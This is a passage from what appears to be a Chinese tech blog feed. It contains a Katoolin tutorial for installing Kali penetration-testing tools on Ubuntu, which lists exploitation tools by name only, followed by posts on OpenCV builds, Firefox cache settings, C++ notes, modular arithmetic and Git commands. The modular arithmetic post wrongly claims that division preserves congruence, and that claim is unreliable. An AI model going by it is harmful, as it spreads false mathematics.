class="line">1) Add kali linux repositories</span><br><span class="line">2) Update</span><br><span class="line">3) Remove all kali linux repositories</span><br><span class="line">4) View the contents of sources.list file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">What do you want to do ?&gt; 2</span><br></pre></td></tr></tbody></table></figure><p>类型<strong>3</strong>，如果你想删除已添加的卡利Linux的存储库，并键入<strong>4</strong>，查看的sources.list文件的内容。</p><p>要返回上一菜单，请键入<strong>back</strong>，然后按Enter。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">What do you want to do ?&gt; back</span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><p>要返回主菜单，请键入<strong>gohome，</strong>然后按Enter。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; gohome</span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="2-类别"><a href="#2-类别" class="headerlink" title="2.类别"></a>2.类别</h3><p>要查看所有可用类别列表，请在主菜单中键入<strong>2</strong>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; 2</span><br><span class="line">**************************** All Categories *****************************</span><br><span class="line">1) Information Gathering8) Exploitation Tools</span><br><span class="line">2) Vulnerability Analysis9) Forensics Tools</span><br><span class="line">3) Wireless Attacks10) Stress Testing</span><br><span class="line">4) Web Applications11) Password Attacks</span><br><span class="line">5) Sniffing &amp; Spoofing12) Reverse Engineering</span><br><span class="line">6) Maintaining Access13) Hardware Hacking</span><br><span class="line">7) Reporting Tools 14) Extra</span><br><span class="line">0) All</span><br><span class="line">Select a category or press (0) to install all Kali linux tools .</span><br></pre></td></tr></tbody></table></figure><p>如您在上面的输出中看到的，有<strong>14个</strong>类别可用。您可以一次安装所有它们，也可以通过输入相应的类别编号来安装任何特定类别。</p><p>要安装所有kali Linux工具，请键入<strong>0</strong>（零），然后按Enter键。这将安装所有工具。需要一段时间，具体取决于Internet的速度。另外，请确保硬盘驱动器中有足够的可用空间。安装所有Kali Linux可能会占用大量磁盘空间。</p><p>如果您不具备所有工具，则只需安装要使用的工具即可。举例来说，要在“ <strong>漏洞利用工具”</strong>类别下安装<strong>工具</strong>，请键入<strong>8</strong>并按Enter。它将显示一个子菜单，并列出此类别中的所有可用软件包。您可以通过键入<strong>0</strong>（零）来安装该类别中的所有工具，或者键入任何特定的数字以将特定工具安装在“利用工具”类别下。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; 8</span><br><span class="line"></span><br><span class="line">=+[ Exploitation Tools</span><br><span class="line"></span><br><span class="line">1) Armitage</span><br><span class="line"> 2) Backdoor Factory</span><br><span class="line"> 3) BeEF</span><br><span class="line"> 4) cisco-auditing-tool</span><br><span class="line"> 5) cisco-global-exploiter </span><br><span class="line"> 6) cisco-ocs</span><br><span class="line"> 7) cisco-torch</span><br><span class="line"> 8) commix</span><br><span class="line"> 9) crackle</span><br><span class="line">10) jboss-autopwn</span><br><span class="line">11) Linux Exploit Suggester</span><br><span class="line">12) Maltego Teeth</span><br><span class="line">13) SET</span><br><span class="line">14) ShellNoob</span><br><span class="line">15) sqlmap</span><br><span class="line">16) THC-IPV6</span><br><span class="line">17) Yersinia</span><br><span class="line"></span><br><span class="line">0) Install all Exploitation Tools</span><br><span class="line"></span><br><span class="line">Insert the number of the tool to install it .</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><p>要返回上<strong>一级</strong>菜单，请键入<strong>back</strong>，然后要返回主菜单，请键入<strong>gohome</strong>。</p><h3 id="3-安装ClassicMenu指示器"><a href="#3-安装ClassicMenu指示器" class="headerlink" title="3.安装ClassicMenu指示器"></a>3.安装ClassicMenu指示器</h3><p>ClassicMenu Indicator是Ubuntu桌面环境顶部面板的通知区域小程序。它为那些喜欢Unity破折号菜单的人提供了一种获取经典GNOME风格应用程序菜单的简单方法。像经典的GNOME菜单一样，它包含Wine游戏和应用程序（如果已安装）。</p><p>要安装它，请键入<strong>3</strong>并按Enter，然后键入y进行确认并安装。</p><h3 id="4-安装Kali菜单"><a href="#4-安装Kali菜单" class="headerlink" title="4.安装Kali菜单"></a>4.安装Kali菜单</h3><p>要安装Kali Menu，请键入<strong>4，</strong> 然后键入 <strong>y</strong> 以确认安装。</p><p>使用Katoolin完成操作后，按 <strong>“ Ctrl + C”</strong>退出。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; ^CShutdown requested...Goodbye...</span><br></pre></td></tr></tbody></table></figure><p>就这样。如您所见，Katoolin是非常简单易用的工具，它提供了一种在Ubuntu Linux盒子中安装Kali Linux工具的简便方法。您并不总是需要Kali Linux来尝试所有取证，渗透和安全测试工具。Katoolin将在任何基于DEB的Linux系统中轻松为您完成此任务。试试看，您不会失望的。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
            
        <tag> 运维 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>静态编译opencv库</title>
      
      
      <link href="/cn/posts/19264/"/>
      
      
      <url>/cn/posts/19264/</url>
      
      
        
      <content type="html"><![CDATA[<p><strong>一、准备</strong>：<br>    1.cmake<br>    2.opencv源码 （<a href="https://opencv.org/releases/%EF%BC%89">https://opencv.org/releases/）</a><br>opencv源码从官网下载源码解压后应该是这样<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19264/20200420204912815.png" alt="在这里插入图片描述"><br><strong>二、编译</strong><br>1.设置源码路径和编译后路径<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19264/20200420205137252.png" alt="在这里插入图片描述"><br>2.点击configure,然后选择配置编译器和编译的opencv库的位数这里我选64位，点击finish：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19264/20200420205232711.png" alt="在这里插入图片描述"><br>3.等待<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/19264/20200420205322192.png" alt="在这里插入图片描述"><br>4.勾选一下可选设置</p><p>（1）、勾选“BUILD_opencv_world”，最后生成一个头文件库，相比之前的一堆头文件方便多了。 </p><p>（2）、添加下载好的modules到OPENCV_EXTRA_MODULES_PATH。</p><p>OPENCV_EXTRA_MODULES_PATH配置说明：由于OpenCV功能越来越臃肿，OpenCV3改变了项目架构，使用内核+插件的架构形式。 因此，OpenCV从2.x到4.x是一个很大的转变，对于很多功能不完善、性能不稳定的模块，都被放到了extra_modules（扩展模块）里面了。在Github中，除了存放正式版OpenCV的主仓库和新增加的OpenCV_extra仓库外，还添加了一个OpenCV_contrib的全新仓库，功能有：脸部识别、文本识别、边缘检测、追踪算法等，里面存放的是功能未稳定的代码，如果需要使用这些功能，就需要重新进行编译。</p><p>各个版本的opencv_contrib下载地址如下：<a href="https://github.com/opencv/opencv_contrib/releases">https://github.com/opencv/opencv_contrib/releases</a></p><p>（3）、如果要编译opencv的静态库，则需要去掉BUILD_SHARED_LIBS的对勾。</p><p>5.配置完成后，点击Generate,等待完成，需要一定时间。红色框体显示Generate完成</p><p>6.点击open Project按钮，打开我们编译生成的工程，选择：生成—批生成：配置完后，点击生成</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 运维 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>修改火狐缓存位置到内存盘</title>
      
      
      <link href="/cn/posts/13213/"/>
      
      
      <url>/cn/posts/13213/</url>
      
      
        
      <content type="html"><![CDATA[<p>1、在地址栏输入about:config 进入设置界面</p><p>2、找到browser.cache.memory.max_entry_size设置使用内存缓存大小，设置值为-1，无限制，可以自己选择，设1的话是1kb，依次类推。</p><p>3、输入browser.cache.memory.enable，确认值为true，火狐默认为true。</p><p>4、输入”browser.cache.disk.enable”, 设置为false</p><p>5、然后在选项-高级-网络里，把无视自动缓存管理勾上，再把使用磁盘缓存空间设为0。</p><p>这样火狐的缓存就在内存里了。</p><p>比较简单，我这里就不上图片了。</p><p>最后输入 about:cache 可以查看缓存占用</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 运维 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>c++杂七杂八的笔记</title>
      
      
      <link href="/cn/posts/49948/"/>
      
      
      <url>/cn/posts/49948/</url>
      
      
        
      <content type="html"><![CDATA[<p>VS 2017 IDE compiler option” /permissive-“</p><p>类中成员变量的声明顺序，决定了成员变量的初始化顺序。假设 Date 类中的构造函数为：</p><p>public:    Date() ： y_(2016), m_(9), d_(22) {}</p><p> 此时，类中的成员函数，在类中的声明顺序 = 构造函数初始化列表顺序，故 y_, m_, d_ 都能被顺利的初始化为对应的值。</p><p> 而当成员变量，在类中的声明顺序 ≠ 构造函数初始化列表顺序 时，</p><p>public:    Date() ： y_(2016), d_(22), m_(d_-13) {}</p><p> 根据成员变量的声明顺序，y_ 首先被初始化为 2016，然后再初始化 m_，但由于 d_ 并未被初始化，所以 m_ 的值是随机的，最后初始化 d_ 为 22</p><p> 这是因为，<strong>类的成员变量在初始化时，其初始化的顺序只与声明顺序有关，而与在初始化列表中的顺序无关。</strong></p><p><strong>scanf函数返回成功读入的数据项数，读入数据时遇到了“文件结束”则返回EOF。</strong></p><p><strong>win 换行\r\n  linux \n  mac \r  linux读取win的文件会读\r\n</strong></p><p><strong>算法竞赛入门经典 46页</strong></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>模运算规则</title>
      
      
      <link href="/cn/posts/56689/"/>
      
      
      <url>/cn/posts/56689/</url>
      
      
        
      <content type="html"><![CDATA[<p>模运算与基本四则运算有些相似，但是除法例外。其规则如下： </p><p>(a + b) % p = (a % p + b % p) % p </p><p>(a - b) % p = (a % p - b % p) % p </p><p>(a * b) % p = (a % p * b % p) % p </p><p>(a^b) % p = ((a % p)^b) % p</p><p>推论： </p><p>若a≡b (% p)，则对于任意的c，都有(a + c) ≡ (b + c) (%p)； </p><p>若a≡b (% p)，则对于任意的c，都有(a * c) ≡ (b * c) (%p)； </p><p>若a≡b (% p)，c≡d (% p)，则 (a + c) ≡ (b + d) (%p)，(a - c) ≡ (b - d) (%p)， </p><p>(a * c) ≡ (b * d) (%p)，(a / c) ≡ (b / d) (%p)；</p><p>费马定理：若p是素数，a是正整数且不能被p整除，则：a^(p-1) mod p = 1 mod p </p><p>推论：若p是素数，a是正整数且不能被p整除，则：a^p mod p = a mod p</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 数学 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>一些个人常用的 Git 指令</title>
      
      
      <link href="/cn/posts/57752/"/>
      
      
      <url>/cn/posts/57752/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>随便整理的一些自用的Git指令</p></blockquote><h2 id="GitHub创建仓库提示代码"><a href="#GitHub创建仓库提示代码" class="headerlink" title="GitHub创建仓库提示代码"></a><strong>GitHub创建仓库提示代码</strong></h2><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo "# 项目名" &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m "first commit"</span><br><span class="line">git remote add origin git@github.com:qiubaiying/项目名.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></tbody></table></figure><p>若仓库存在直接push</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:qiubaiying/test.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></tbody></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a><strong>常用操作</strong></h2><h3 id="创建仓库（初始化）"><a href="#创建仓库（初始化）" class="headerlink" title="创建仓库（初始化）"></a><strong>创建仓库（初始化）</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在当前指定目录下创建</span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line">新建一个仓库目录</span><br><span class="line">git init [project-name]</span><br><span class="line"></span><br><span class="line">克隆一个远程项目</span><br><span class="line">git clone [url]</span><br></pre></td></tr></tbody></table></figure><h3 id="添加文件到缓存区"><a href="#添加文件到缓存区" class="headerlink" title="添加文件到缓存区"></a><strong>添加文件到缓存区</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加所有变化的文件</span><br></pre></td></tr></tbody></table></figure><p>git add .</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">添加名称指定文件</span><br><span class="line">git add text.txt</span><br></pre></td></tr></tbody></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a><strong>配置</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">设置提交代码时的用户信息</span><br><span class="line">git config [--global] user.name "[name]"</span><br><span class="line">git config [--global] user.email "[email address]"</span><br></pre></td></tr></tbody></table></figure><h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a><strong>提交</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">提交暂存区到仓库区</span><br><span class="line">git commit -m "msg"</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></tbody></table></figure><h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a><strong>远程同步</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 下载远程仓库的所有变动</span><br><span class="line">$ git fetch [remote]</span><br><span class="line"></span><br><span class="line"># 显示所有远程仓库</span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"># 显示某个远程仓库的信息</span><br><span class="line">$ git remote show [remote]</span><br><span class="line"></span><br><span class="line"># 增加一个新的远程仓库，并命名</span><br><span class="line">$ git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的变化，并与本地分支合并</span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 上传本地指定分支到远程仓库</span><br><span class="line">$ git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">$ git push [remote] --force</span><br><span class="line"></span><br><span class="line"># 推送所有分支到远程仓库</span><br><span class="line">$ git push [remote] --all</span><br></pre></td></tr></tbody></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a><strong>分支</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有本地分支</span><br><span class="line">$ git branch</span><br><span class="line"></span><br><span class="line"># 列出所有远程分支</span><br><span class="line">$ git branch -r</span><br><span class="line"></span><br><span class="line"># 列出所有本地分支和远程分支</span><br><span class="line">$ git branch -a</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">$ git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 切换到上一个分支</span><br><span class="line">$ git checkout -</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"># 删除分支</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></tbody></table></figure><h3 id="标签Tags"><a href="#标签Tags" class="headerlink" title="标签Tags"></a><strong>标签Tags</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">添加标签 在当前commit</span><br><span class="line">git tag -a v1.0 -m 'xxx' </span><br><span class="line"></span><br><span class="line">添加标签 在指定commit</span><br><span class="line">git tag v1.0 [commit]</span><br><span class="line"></span><br><span class="line">查看</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">git tag -d V1.0</span><br><span class="line"></span><br><span class="line">删除远程tag</span><br><span class="line">git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line">推送</span><br><span class="line">git push origin --tags</span><br><span class="line"></span><br><span class="line">拉取</span><br><span class="line">git fetch origin tag V1.0</span><br><span class="line"></span><br><span class="line">新建一个分支，指向某个tag</span><br><span class="line">git checkout -b [branch] [tag]</span><br></pre></td></tr></tbody></table></figure><h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a><strong>查看信息</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># 显示有变更的文件</span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"># 显示当前分支的版本历史</span><br><span class="line">$ git log</span><br><span class="line"></span><br><span class="line"># 显示commit历史，以及每次commit发生变更的文件</span><br><span class="line">$ git log --stat</span><br><span class="line"></span><br><span class="line"># 搜索提交历史，根据关键词</span><br><span class="line">$ git log -S [keyword]</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，每个commit占据一行</span><br><span class="line">$ git log [tag] HEAD --pretty=format:%s</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</span><br><span class="line">$ git log [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"># 显示某个文件的版本历史，包括文件改名</span><br><span class="line">$ git log --follow [file]</span><br><span class="line">$ git whatchanged [file]</span><br><span class="line"></span><br><span class="line"># 显示指定文件相关的每一次diff</span><br><span class="line">$ git log -p [file]</span><br><span class="line"></span><br><span class="line"># 显示过去5次提交</span><br><span class="line">$ git log -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"># 显示所有提交过的用户，按提交次数排序</span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 显示指定文件是什么人在什么时间修改过</span><br><span class="line">$ git blame [file]</span><br><span class="line"></span><br><span class="line"># 显示暂存区和工作区的差异</span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"># 显示暂存区和上一个commit的差异</span><br><span class="line">$ git diff --cached [file]</span><br><span class="line"></span><br><span class="line"># 显示工作区与当前分支最新commit之间的差异</span><br><span class="line">$ git diff HEAD</span><br><span class="line"></span><br><span class="line"># 显示两次提交之间的差异</span><br><span class="line">$ git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"># 显示今天你写了多少行代码</span><br><span class="line">$ git diff --shortstat "@{0 day ago}"</span><br><span class="line"></span><br><span class="line"># 显示某次提交的元数据和内容变化</span><br><span class="line">$ git show [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交发生变化的文件</span><br><span class="line">$ git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交时，某个文件的内容</span><br><span class="line">$ git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"># 显示当前分支的最近几次提交</span><br><span class="line">$ git reflog</span><br></pre></td></tr></tbody></table></figure><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a><strong>撤销</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复某个commit的指定文件到暂存区和工作区</span><br><span class="line">$ git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span><br><span class="line">$ git reset [file]</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span><br><span class="line">$ git reset [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span><br><span class="line">$ git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span><br><span class="line">$ git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个commit，用来撤销指定commit</span><br><span class="line"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span><br><span class="line">$ git revert [commit]</span><br><span class="line"></span><br><span class="line"># 暂时将未提交的变化移除，稍后再移入</span><br><span class="line">$ git stash</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></tbody></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成一个可供发布的压缩包</span><br><span class="line">$ git archives</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> git </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Linux 下将校园网客户端锐捷制作成服务并开机启动</title>
      
      
      <link href="/cn/posts/37686/"/>
      
      
